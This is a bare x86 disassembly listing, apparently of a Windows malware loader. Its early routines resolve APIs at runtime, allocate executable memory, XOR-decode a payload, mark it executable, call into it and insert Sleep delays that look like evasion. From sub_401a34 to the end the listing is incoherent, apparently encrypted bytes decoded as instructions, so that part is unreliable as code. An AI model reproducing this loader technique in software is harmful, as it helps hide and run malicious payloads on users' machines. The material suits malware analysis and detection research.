sub_401000
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi + 0x30 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x18 ]
push eax
push edi
push sub_401123
push ecx
call sub_40d6ed
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ edi + 0x20 ]
mov ecx [ edi + 0x4 ]
movzx eax [ ecx ]
push eax
push ecx
push 0x2
push edi
call sub_40105d
add esp 0x10
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
movzx esi si
or esi 0x80070000
jmp r-xdata
sub_40105d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
call sub_40d72d
add esp 0x14
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_401088
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_40d770
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
pop ecx
pop esi
pop ebp
retn
sub_4010a7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
push esi
mov esi r--data
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx + 0x1 ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
sub_4010df
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov esi r--data
mov edx edi
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx * 2 + 0x2 ]
mov [ ecx + 0x4 ] edi
mov [ ecx + 0xc ] edi
pop edi
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x2 ]
mov ax [ edx ]
add edx 0x2
cmp ax di
jne r-xdata
sub edx ecx
sar edx 0x1
sub_401123
push ebp
mov ebp esp
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
pop ebp
retn 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x20 ]
sub ecx 0x0
je r-xdata
and [ eax ] 0x0
sub ecx 0x1
jne r-xdata
pop esi
pop edi
pop ebx
push [ eax + 0x34 ]
push [ ebp + 0x24 ]
push edi
push ebx
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40c250
call esi
mov ecx [ ebp + 0x18 ]
test dl dl
je r-xdata
mov ecx 0x100
movzx ecx dl
inc ecx
jmp r-xdata
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] edi
jmp r-xdata
sub_40119b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
je r-xdata
mov al 0x1
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov eax [ edx + 0xc ]
and ecx [ ebp + 0xc ]
and eax [ ebp + 0x10 ]
or ecx eax
je r-xdata
xor al al
pop ebp
retn
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0x14 ]
and eax [ ebp + 0xc ]
and ecx [ ebp + 0x10 ]
cmp eax [ edx + 0x10 ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
je r-xdata
sub_4011d7
push ebp
mov ebp esp
sub esp 0x10
mov al [ r--data ]
mov edx [ ebp + 0xc ]
mov ecx edx
push esi
mov esi [ ebp + 0x8 ]
sub ecx r--data
or ecx 0xb000000
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x8 ]
add edx 0xc
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x4 ]
push ecx
and [ ecx + 0x4 ] 0x0
push [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax [ esi + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
movzx eax [ eax ]
and [ ecx + 0x14 ] 0x0
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] 0x2
mov [ ecx + 0x10 ] edx
movzx eax [ edx ]
mov [ ecx + 0x18 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ecx + 0x1c ] 0x1
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_40d7aa
add esp 0x1c
pop esi
mov esp ebp
pop ebp
retn
sub_4012b0
push ebp
mov ebp esp
push 0xffffffff
push sub_41d730
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1028
call sub_40a8c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0x208
mov [ ebp - 0x102c ] eax
call sub_40a8a2
push 0x318
call sub_40a861
add esp 0x8
mov [ ebp - 0x1028 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_401470
jmp r-xdata
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x0
call sub_40e4f9
int3
push 0x0
push 0x0
push ebx
mov ecx eax
call sub_401490
push 0x40
push 0x3000
push eax
push 0x0
mov [ ebp - 0x1030 ] eax
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edi [ Sleep@IAT ]
mov [ ebp - 0x1028 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x1028 ]
push esi
push 0x0
push ebx
call sub_401490
test eax eax
je r-xdata
push [ ebp - 0x1030 ]
call sub_40a8a2
add esp 0x4
mov esi eax
lea eax [ ebp - 0x1034 ]
push eax
push 0x40
push [ ebp - 0x1030 ]
push esi
call [ VirtualProtect@IAT ]
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x7dc ]
xor esi esi
mov [ ebp - 0x102c ] eax
lea ebx [ ebp - 0x10 ]
push [ ebp - 0x102c ]
lea ecx [ ebp - 0x1024 ]
call sub_4015c0
push esi
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0x1
call sub_4017e0
lea ecx [ ebp - 0x1024 ]
call sub_401920
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_40c250
push 0x1
call edi
mov eax [ ebx ]
lea ebx [ ebx - 0x4 ]
add eax 0x10
xor eax [ ebp + esi * 4 - 0x420 ]
xor eax 0x8f
mov [ ebp + esi * 4 - 0x420 ] eax
inc esi
cmp esi 0x104
jl r-xdata
cmp [ ebp - 0x41c ] 0x2710
je r-xdata
push 0xffffffff
call edi
call [ ebp - 0x102c ]
sub_401490
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edi
mov eax [ edi + 0x4 ]
mov [ ebx + 0x104 ] eax
push [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
add eax edi
push eax
push ebx
call sub_40b8f0
add edi [ edi + 0x10 ]
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0xc ]
mov [ ebx + 0x10c ] eax
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
push ecx
push edi
mov ecx ebx
call sub_4014f0
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4014f0
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
xor esi esi
test eax eax
je r-xdata
pop edi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
nop [ eax ] eax
cmp esi [ ebp - 0x8 ]
jbe r-xdata
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ eax + edi ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_401590
add esp 0x8
xor eax eax
test ebx ebx
je r-xdata
sub_401590
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x1
call sub_40e5f8
add esp 0x4
lea ecx [ ebp + 0xc ]
push ecx
push 0x0
push esi
push eax
call sub_401580
push [ eax + 0x4 ]
push [ eax ]
call sub_4108ea
add esp 0x18
pop esi
pop ebp
retn
sub_4015c0
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
push 0x104
lea eax [ ebx + 0x14 ]
mov [ ebx + 0xc00 ] 0x0
push eax
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
push r--data
call [ LoadLibraryA@IAT ]
push r--data
push eax
mov [ ebx ] eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov esi eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] esi
call eax
mov [ ebx + 0x4 ] eax
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
sub_401630
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi ecx
lea eax [ edi + 0x21c ]
push eax
call [ lstrlenW@IAT ]
mov eax [ r--data ]
movq xmm0 [ r--data ]
mov [ ebp - 0xc ] eax
mov ax [ r--data ]
mov [ ebp - 0x8 ] ax
mov al [ r--data ]
movq [ ebp - 0x14 ] xmm0
movups xmm0 [ r--data ]
mov [ ebp - 0x6 ] al
mov eax [ edi + 0x4 ]
push r--data
movups [ ebp - 0x24 ] xmm0
call eax
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ edi ]
call ecx
mov esi eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
push ebx
call eax
test esi esi
je r-xdata
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x22c ]
push 0x0
push eax
call sub_40be70
add esp 0xc
lea eax [ ebp - 0x22c ]
push 0x104
push r--data
push eax
call [ lstrcpynW@IAT ]
mov eax [ edi + 0x42c ]
mov ebx [ lstrcatW@IAT ]
cmp eax 0x80000001
jne r-xdata
cmp eax 0x80000002
jne r-xdata
push r--data
jmp r-xdata
lea eax [ edi + 0x430 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call ebx
push r--data
lea eax [ ebp - 0x22c ]
push eax
call ebx
lea eax [ edi + 0x624 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call ebx
push r--data
lea eax [ ebp - 0x22c ]
push eax
call ebx
lea eax [ edi + 0x21c ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call ebx
push r--data
lea eax [ ebp - 0x22c ]
push eax
call ebx
push 0x40
lea eax [ ebp - 0x27c ]
mov [ ebp - 0x280 ] 0x44
push 0x0
push eax
call sub_40be70
add esp 0xc
xor eax eax
mov [ ebp - 0x250 ] ax
lea eax [ ebp - 0x23c ]
push eax
lea eax [ ebp - 0x280 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x22c ]
push eax
push 0x0
call esi
push r--data
lea eax [ ebp - 0x22c ]
push eax
call ebx
sub_4017e0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
push 0x7dc
push 0x0
lea edi [ ebx + 0x424 ]
push edi
call sub_40be70
mov esi [ ebp + 0x8 ]
add esp 0xc
mov ecx 0x1f7
[ edi ] [ esi ]
lea esi [ ebx + 0x818 ]
push esi
call [ lstrlenW@IAT ]
sub eax 0x1
js r-xdata
cmp [ esi ] 0x25
jne r-xdata
lea ecx [ ebx + 0x818 ]
lea ecx [ ecx + eax * 2 ]
lea eax [ ebx + 0xa0c ]
push eax
push esi
add esi 0x2
push r--data
push esi
call sub_40bfcd
add esp 0x8
test eax eax
je r-xdata
xor edx edx
mov [ ecx ] dx
sub ecx 0x2
sub eax 0x1
jns r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn 0x4
push r--data
push esi
call sub_40bfcd
mov edi eax
add esp 0x8
sub edi esi
sar edi 0x1
je r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40be70
add esp 0xc
xor eax eax
mov [ esi + edi * 2 ] ax
mov eax [ ebx + 0x8 ]
push r--data
push [ ebx ]
call eax
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call eax
mov eax 0x25
mov [ esi + edi * 2 ] ax
lea eax [ esi + 0x2 ]
lea eax [ eax + edi * 2 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebx + 0xa0c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
push r--data
lea eax [ ebx + 0x21c ]
push 0x104
push eax
call sub_4036b0
add esp 0x14
sub_401920
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x60 ] ecx
call sub_40e50f
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x6c ] 0x0
mov [ ebp - 0x64 ] 0x0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
add eax 0x1
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x3e8
je r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x68 ]
cmp edx [ ebp - 0x5c ]
jae r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x5c ]
je r-xdata
mov eax [ ebp - 0x64 ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x64 ] 0x1
je r-xdata
call sub_40e50f
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x68 ]
add ecx 0x1
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x60 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x60 ]
add ecx 0x14
push ecx
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x70 ] edx
push esi
push ebx
sub esp 0x10
call sub_4020ac
retn 0x50
sub_401a34
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44ded6
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
push cs
sbb al [ eax ]
sub esp 0x10
pop edx
ja r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8af9a36
pushfd
call sub_401a1f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_401a34
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
jg r-xdata
jmp [ 0xce8d0f ]
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c12aff
jne r-xdata
call sub_401abf
ja 0x5049ec6
call 0x529072ff
add esp 0x4
jns r-xdata
mov eax 0xc7819173
jge r-xdata
jmp 0xffffffff844f4d60
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa3df
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff969e36
pop eax
jns r-xdata
sub eax 0xfec5e89c
jno r-xdata
sub esi 0x73bd047f
push ebp
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16400879
pop edx
jg r-xdata
jpo 0xf70939c
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed09ea8
jne r-xdata
jno 0xffffffff834f72a3
ja r-xdata
jmp [ 0xfffffffff381df77 ]
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1da8f
jae r-xdata
je 0xffffffff814fbc75
jne 0xffffffffeac123cf
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
ja r-xdata
call 0xffc959e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
jg 0xffffffff9c946eaa
ja r-xdata
jns r-xdata
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc19bc9
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
push esi
push esi
call sub_401baa
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd74a1
push edx
call sub_401ae0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a45965
jae r-xdata
je 0xffffffffa3a4c075
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
pop edx
pop edx
call sub_401b5f
xor edi 0x517f5859
jno 0xfffffffff2c1761c
push ecx
push ebx
call sub_401aaf
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a400
ja r-xdata
jge 0x71fc5c07
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
push ebp
pushfd
call sub_401d08
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jno r-xdata
mov ebx 0xf04c483
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jne r-xdata
or edx 0xf3812e79
pushfd
push esi
call sub_401cff
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_401e19
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
pop eax
jge r-xdata
jge 0xffffffffffa29fb4
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jno r-xdata
sub esi 0x89641f79
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15aee
jae r-xdata
add edx 0xff108f0f
pop ecx
jns r-xdata
jno 0xffffffff874f5267
jne r-xdata
sub edi 0x64244481
movsd [ edi ] [ esi ]
and eax [ eax ]
add esp 0x4
ja r-xdata
jl 0xffffffffffacad2c
jae r-xdata
ja 0xffffffffa3c32cc4
push ecx
push edx
push ebp
sub esp 0x4
call sub_401ccb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
ja r-xdata
pop edx
mov eax 0xff55870f
jg r-xdata
jpo 0xdea2aa
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
ja r-xdata
xor ebx 0xff3d870f
call sub_401c7b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402099
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
jmp 0xffffffffff799dc2
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92722
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_401d2b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
add eax 0x5abb2979
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e2de
jg r-xdata
ja 0xcaa0da
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e50d
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e1e4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9b9f81
pop edx
jge r-xdata
jo 0xffffffff854f77d3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e299
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcefd8
jae r-xdata
call sub_401e90
jb 0xffffffff81b29b46
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f92f4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a317
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd2f1b
add esp 0x4
jae r-xdata
jl 0xf3a05c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_401d36
jae 0xffffffffff43a55b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7755
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89171f2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a2b6
push edi
call sub_401f88
jg 0xfffffffff0b379af
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133ae32
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x586614ab
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7985
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff842897d1
jae r-xdata
call 0xffffffff854f79bf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95bc60
jo 0xffffffffa2c12e73
push ecx
push edx
call sub_401f58
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c152b5
push edx
call sub_401ef4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_401f6f
jo 0xff9955c
jo 0xffffffff894f7999
jae r-xdata
je 0xffffffffff6da3a3
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_401f32
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
